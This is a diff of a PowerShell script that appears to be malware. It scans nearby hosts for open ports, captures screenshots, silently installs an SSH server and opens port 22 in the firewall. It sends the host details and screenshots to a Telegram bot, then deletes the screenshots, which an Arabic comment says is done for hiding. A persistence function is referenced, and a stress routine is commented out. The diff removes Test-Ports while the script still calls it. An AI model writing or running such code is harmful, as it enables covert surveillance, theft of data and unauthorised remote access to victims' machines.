@@ -46,35 +46,16 @@ function Get-SystemInfo {
 
 # Network Devices Scan
 function Get-NetworkDevices {
-  $arp = arp -a 2>$null
   $devices = @()
-  foreach ($line in $arp) {
-    if ($line -match '(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9-]+)') {
-      $ip = $matches[1]
-      $ports = Test-Ports $ip
-      $devices += "IP: $ip | MAC: $($matches[2]) | Ports: $ports"
-    }
+  $neighbors = Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Reachable" }
+  foreach ($n in $neighbors) {
+    $ip  = $n.IPAddress
+    $mac = $n.LinkLayerAddress
+    $ports = Test-Ports $ip
+    $devices += "IP: $ip | MAC: $mac | Ports: $ports"
   }
   return $devices
 }
-
-function Test-Ports($IP) {
-  $openPorts = @()
-  $ports = @(22,80,443,3389,445,8080,21)
-  foreach ($port in $ports) {
-    $tcpClient = New-Object System.Net.Sockets.TcpClient
-    $asyncResult = $tcpClient.BeginConnect($IP, $port, $null, $null)
-    if ($asyncResult.AsyncWaitHandle.WaitOne(1000, $false)) {
-      try {
-        $tcpClient.EndConnect($asyncResult)
-        $openPorts += $port
-      } catch { }
-    }
-    $tcpClient.Close()
-  }
-  return if ($openPorts.Count -gt 0) { $openPorts -join ',' } else { 'closed' }
-}
-
 # Screenshot Function
 function Take-Screenshot {
   Add-Type -AssemblyName System.Drawing, System.Windows.Forms
@@ -90,13 +71,26 @@ function Take-Screenshot {
 }
 
 # Setup SSH Server
+# Setup SSH Server
 function Setup-SSH {
-  Write-Log "Installing SSH Server"
-  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
-  Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
-  Start-Service sshd -ErrorAction SilentlyContinue
-  New-NetFirewallRule -DisplayName "Stress SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
-  Write-Log "SSH Server Active on Port 22"
+  Write-Log "Installing SSH Server (if not exist)"
+  $capability = Get-WindowsCapability -Online | Where-Object { $_.Name -like "OpenSSH.Server*" }
+  if (!$capability -or $capability.State -ne "Installed") {
+    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
+  }
+
+  $service = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
+  if ($service -and $service.Status -ne "Running") {
+    Set-Service -Name sshd -StartupType Automatic
+    Start-Service sshd
+  }
+
+  $rule = Get-NetFirewallRule -DisplayName "Stress SSH" -ErrorAction SilentlyContinue
+  if (!$rule) {
+    New-NetFirewallRule -DisplayName "Stress SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
+  }
+
+  Write-Log "SSH Server: sshd started on port 22"
 }
 
 # Send to Telegram
@@ -116,19 +110,26 @@ function Send-Telegram($info, $screenshot) {
 
 Network Scan: $($networkDevices.Count) devices found
 "@
-  
+
   $uri = "https://api.telegram.org/bot$BotToken/sendMessage"
   $body = @{ chat_id = $ChatID; text = $msg; parse_mode = "Markdown" } | ConvertTo-Json
   Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
   if (Test-Path $screenshot) {
+    Write-Log "Attaching screenshot: $screenshot"
     $photoUri = "https://api.telegram.org/bot$BotToken/sendPhoto"
-    $photoBody = @{ chat_id = $ChatID; caption = "🖥️ $($info.Host) | SSH: $($info.SSHUser)@$($info.IP)" }
-    $photoBody.photo = Get-Item $screenshot
-    Invoke-RestMethod -Uri $photoUri -Method Post -Form $photoBody -ErrorAction SilentlyContinue
+    $photoBody = @{
+      chat_id = $ChatID
+      caption = "🖥️ $($info.Host) | SSH: $($info.SSHUser)@$($info.IP)"
+    }
+    $photoBody.photo = Get-Item -Path $screenshot
+    $rv = Invoke-RestMethod -Uri $photoUri -Method Post -Form $photoBody -ErrorAction SilentlyContinue
+    Write-Log "Screenshot sent and response: $rv.ok"
 
+    # حذف الصور للإخفاء
     Get-ChildItem $ScreenshotDir -Filter "*.png" | Remove-Item -Force -ErrorAction SilentlyContinue
-    Write-Log "Screenshot sent and deleted"
+  } else {
+    Write-Log "Screenshot file not found: $screenshot"
   }
 }
 
@@ -159,28 +160,28 @@ function Install-Persistence {
 }
 
 # CPU + RAM Stress
-function Start-Stress {
-  Write-Log "Starting CPU/RAM stress"
+# function Start-Stress {
+#   Write-Log "Starting CPU/RAM stress"
   
-  # CPU Stress (85% load)
-  1..([Environment]::ProcessorCount) | ForEach-Object { 
-    Start-Job -ScriptBlock { 
-      while ($true) {
-        1..1000 | ForEach-Object { [math]::Pow($_, 2) * [math]::Sin($_) }
-        Start-Sleep -Milliseconds 85
-      }
-    } | Out-Null 
-  }
+#   # CPU Stress (85% load)
+#   1..([Environment]::ProcessorCount) | ForEach-Object { 
+#     Start-Job -ScriptBlock { 
+#       while ($true) {
+#         1..1000 | ForEach-Object { [math]::Pow($_, 2) * [math]::Sin($_) }
+#         Start-Sleep -Milliseconds 85
+#       }
+#     } | Out-Null 
+#   }
   
-  # RAM Stress (512MB)
-  Start-Job -ScriptBlock { 
-    $memory = New-Object byte[] (512 * 1MB)
-    while ($true) {
-      0..($memory.Length - 1) | ForEach-Object { $memory[$_] = Get-Random -Maximum 256 }
-      Start-Sleep 3
-    }
-  } | Out-Null
-}
+#   # RAM Stress (512MB)
+#   Start-Job -ScriptBlock { 
+#     $memory = New-Object byte[] (512 * 1MB)
+#     while ($true) {
+#       0..($memory.Length - 1) | ForEach-Object { $memory[$_] = Get-Random -Maximum 256 }
+#       Start-Sleep 3
+#     }
+#   } | Out-Null
+# }
 
 # === MAIN EXECUTION ===
 Write-Log "=== FULL EXECUTION START ==="
